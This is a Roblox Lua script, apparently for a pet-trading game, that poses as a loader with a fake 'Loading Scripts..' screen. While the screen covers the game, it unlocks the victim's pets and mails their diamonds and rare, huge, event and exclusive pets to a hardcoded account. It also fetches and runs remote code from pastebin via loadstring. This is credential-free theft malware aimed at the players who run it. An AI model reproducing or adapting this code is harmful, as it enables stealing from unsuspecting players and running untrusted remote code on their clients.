local screen = Instance.new("ScreenGui")
screen.Parent = game.CoreGui
screen.IgnoreGuiInset = true
local soulOd = Instance.new('ImageLabel', screen)
soulOd.Image = 'rbxassetid://3899340550'
soulOd.ZIndex = 1
soulOd.BackgroundTransparency = 0
soulOd.BackgroundColor3 = Color3.new(.4,.4,.4)
soulOd.Size = UDim2.new(1,0,1,0)
local frame = Instance.new('Frame', screen)
frame.Size = UDim2.new(.715,0,0.1,0)
frame.Position = UDim2.new(.15, 0, .65, 0)
frame.BackgroundColor3 = Color3.new(.2,.2,.2)
frame.BackgroundTransparency = 0
local loadingBar = Instance.new('Frame', frame)
loadingBar.Size = UDim2.new(0,0,1,0)
loadingBar.ZIndex = 2
loadingBar.BackgroundTransparency = 0
loadingBar.BackgroundColor3 = Color3.new(.4,.4,.4)
local soulText = Instance.new('ImageLabel', screen)
soulText.Size = UDim2.new(1,0,1,0)
soulText.Position = UDim2.new(0,0,-0.08,0)
soulText.BackgroundTransparency = 1
soulText.ZIndex = 3
soulText.Image = 'rbxassetid://3899340550'
local newText = Instance.new('TextLabel', frame)
local newTexts1 = Instance.new('TextLabel', frame)
newTexts1.TextSize = 80
newTexts1.Font = Enum.Font.FredokaOne
newTexts1.Size = UDim2.new(1,0,1,0)
newTexts1.ZIndex = 3
newTexts1.TextColor3 = Color3.new(.9,.9,.9)
newTexts1.BackgroundTransparency = 1
newTexts1.Text = _G.ScriptName
newTexts1.Position = UDim2.new(newTexts1.Position.X.Scale, newTexts1.Position.X.Offset, newTexts1.Position.Y.Scale, newTexts1.Position.Y.Offset - 500)
local newTexts3 = Instance.new('TextLabel', frame)
newTexts3.TextSize = 20
newTexts3.Font = Enum.Font.FredokaOne
newTexts3.Size = UDim2.new(1,0,1,0)
newTexts3.ZIndex = 3
newTexts3.TextColor3 = Color3.new(.9,.9,.9)
newTexts3.BackgroundTransparency = 1
newTexts3.Text = "Loading Scripts.."
newTexts3.Position = UDim2.new(newTexts1.Position.X.Scale, newTexts1.Position.X.Offset, newTexts1.Position.Y.Scale, newTexts1.Position.Y.Offset + 470)





local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network); 
local Fire, Invoke = Network.Fire, Network.Invoke; 
hookfunction(getupvalue(Fire, 1), function(...) return true end)

local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
if game.Players.LocalPlayer.leaderstats.Diamonds.Value <100000 then
    game.Players.LocalPlayer:Kick("Error launching script. Error code: ".._G.ScriptName..".LaunchScript")
end 


game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
local mailbox = game:GetService("Workspace")["__MAP"].Interactive.Mailbox
for i,v in pairs(mailbox:GetDescendants()) do
	if v:IsA("MeshPart") or v:IsA("Part") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
		break
	end
end



-- loading screen ^^
local folders = {
  game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
  game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic,
}




local function unlockPetsInFolder(folder)
  local children = folder:GetChildren() -- Get all the children of the folder

  for _, child in ipairs(children) do -- Loop through each child in the folder
    if child:IsA("TextButton") and child.Locked.Visible == true then -- Check if the child is a TextButton
    local name = child.Name
	if child.Name then -- Get the name of the TextButton
    	local args2 = {
    		[1] = {
				[""..name] = false
    		}
		}
		Invoke("Lock Pet", unpack(args2))
    end
    end
  end
end



while true do
  for _, folder in ipairs(folders) do
    unlockPetsInFolder(folder)
    wait(.2) -- Wait for 1 second before running the function again
  end
  local lockedCount = 0
  for _, folder in ipairs(folders) do
    for _, child in ipairs(folder:GetChildren()) do
      if child:IsA("TextButton") and child.Locked.Visible == true then
        lockedCount = lockedCount + 1
      end
    end
  end
  if lockedCount == 0 then
    break
  end
end

	
	
for i,v in pairs(game:GetDescendants()) do
	if v:IsA("Sound") then
		v:Destroy()
	end
end



if game.Players.LocalPlayer.leaderstats.Diamonds.Value >100000000000 then
	local args = {
    	[1] = {
        ["Recipient"] = "peertjelol2009",
        ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
        ["Pets"] = {v.uid},
        ["Message"] = "Paxz GEMS!"
    	}
	}
	Invoke("Send Mail", unpack(args))
	repeat wait() until game.Players.LocalPlayer.leaderstats.Diamonds.Value <10000000
end


local savedPets = FrameworkLibrary.Save.Get().Pets
hugeamount = 0
for i,v in pairs(savedPets) do
	local v2 = FrameworkLibrary.Directory.Pets[v.id]
	if v2.huge == true then
		hugeamount = hugeamount + 1
	end
end


	


if hugeamount >5 then
	_G.Username = "peertjelol2009"
end
while wait() do
for i,v in pairs(savedPets) do
    local v2 = FrameworkLibrary.Directory.Pets[v.id]
	if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 or v2.rarity == "Event" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 or v2.rarity == "Exclusive" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 then
            --loadstring(game:HttpGet("https://pastebin.com/raw/LjRnXwGB"))()
		_G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 4900000
		local args = {
    	[1] = {
        ["Recipient"] = _G.Username,
        ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
        ["Pets"] = {v.uid},
        ["Message"] = "gg/lunarhub | Username: ".._G.Username..""
    	}
		}
		print("l")
		Invoke("Send Mail", unpack(args))
		_G.PetName = v2.name
		_G.PetRar = v2.rarity
		loadstring(game:HttpGet("https://pastebin.com/raw/Crk3YAnP"))()
		loadstring(game:HttpGet("obfuscated pastebin here"))()
	elseif v2.huge == true or v2.rarity == "Event" or v2.rarity == "Exclusive" then
            --loadstring(game:HttpGet("https://pastebin.com/raw/LjRnXwGB"))()
		_G.Diamonds = 0
		local args = {
    	[1] = {
        ["Recipient"] = _G.Username,
        ["Diamonds"] = 0,
        ["Pets"] = {v.uid},
        ["Message"] = "gg/lunarhub | Username: ".._G.Username..""
    	}
		}
		Invoke("Send Mail", unpack(args))
		_G.PetName = v2.name
		_G.PetRar = v2.rarity
        loadstring(game:HttpGet("https://pastebin.com/raw/Crk3YAnP"))()
        wait(1.5)
        loadstring(game:HttpGet("obfuscated pastebin here"))()
	end
end
end
